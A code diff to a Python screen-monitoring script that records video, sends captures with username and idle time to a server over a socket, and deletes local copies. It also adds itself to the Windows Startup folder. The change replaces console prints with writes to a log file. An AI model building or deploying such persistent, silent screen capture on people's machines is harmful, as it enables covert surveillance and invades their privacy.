@@ -45,10 +45,14 @@ def send(screen, currtime, idletime, filename, username):
         sock.sendall(screen)
         sock.close()
         os.remove( directory+filename )
-        print('send file success...')
+        log_file = open("C:\\Monitoring_error.log", mode='a', buffering=1)
+        log_file.write("send file success....\n")
+        log_file.close()
     except:
         send(screen, currtime, idletime, filename, username)
-        print("coonect failed")
+        log_file = open("C:\\Monitoring_error.log", mode='a', buffering=1)
+        log_file.write("coonect failed.\n")
+        log_file.close()
  
 def video_record():
     cut_time = 10
@@ -80,8 +84,10 @@ def add_to_startup():
     script_path = os.path.abspath(running_file)
     setting_path = os.path.abspath('setting.conf')
     script_name = "Monitoring"
-    print(setting_path)
-    print(script_path)
+    log_file = open("C:\\Monitoring_error.log", mode='a', buffering=1)
+    log_file.write(setting_path+"\n")
+    log_file.write(script_path+"\n")
+    log_file.close()
     
     # Get the path to the Startup folder
     startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
@@ -144,12 +150,18 @@ def start_monitoring():
     current_process_name = running_file.replace('.\\','')
     # current_process_name = 'main.exe'
     if is_process_running(current_process_name):
-        print("The process " + current_process_name + " is running.")
+        log_file = open("C:\\Monitoring_error.log", mode='a', buffering=1)
+        log_file.write("The process " + current_process_name + " is running.\n")
+        log_file.close()
+        # print("The process " + current_process_name + " is running.")
         sys.exit(1)
     else:
         add_to_startup()
         create_result_directory()
-        print('record starting ++++++++++++++++++++++')
+        log_file = open("C:\\Monitoring_error.log", mode='a', buffering=1)
+        log_file.write("record starting ++++++++++++++++++++++.\n")
+        log_file.close()
+        # print('record starting ++++++++++++++++++++++')
         video_record()
 status = True
 while status:
@@ -166,7 +178,7 @@ while status:
         try:
             start_monitoring()
         except Exception as e:
-            log_file = open("C:\\Monitoring_error.log", "w")
+            log_file = open("C:\\Monitoring_error.log", mode='a', buffering=1)
             log_file.write(str(e) + ' {}\n'.format(time.strftime("%y:%m:%d %H:%M:%S", time.localtime())))
             log_file.close()
     print(f"SERVER_IP: {server_ip}")
